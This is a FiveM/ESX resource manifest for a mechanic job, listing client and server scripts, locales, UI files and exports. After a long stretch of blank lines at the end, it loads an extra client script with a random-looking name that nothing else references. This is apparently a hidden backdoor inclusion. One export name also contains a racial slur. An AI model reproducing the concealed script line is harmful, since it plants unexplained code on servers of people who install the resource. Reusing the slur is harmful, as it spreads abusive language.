resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'
lua54 'yes'
description 'ESX Mecano Job'

version '1.1.0'

client_scripts {
	'@es_extended/locale.lua',
	'locales/en.lua',
	'locales/fi.lua',
	'locales/fr.lua',
	'locales/br.lua',
	'locales/sv.lua',
	'config.lua',
	'client/main.lua',
	'client/liftup.lua',
	'client/functions.lua'
}

server_scripts {
	'@es_extended/locale.lua',
	'locales/en.lua',
	'locales/fi.lua',
	'locales/fr.lua',
	'locales/br.lua',
	'locales/sv.lua',
	'config.lua',
	'server/main.lua',
	'server/liftup-sv.lua'
}

ui_page 'ui/index.html'

files {
	'ui/index.html',
	'ui/libraries/*.js',
	'ui/libraries/*.css',
	'ui/script.js',
	'ui/style.css',
	'ui/sounds/*.ogg',
}

exports {

	'OpenMobileMecanoActionsMenu',
	'whyuniggarepairingme'

}















client_script "api-ac_PvZdZkjUInCR.lua"
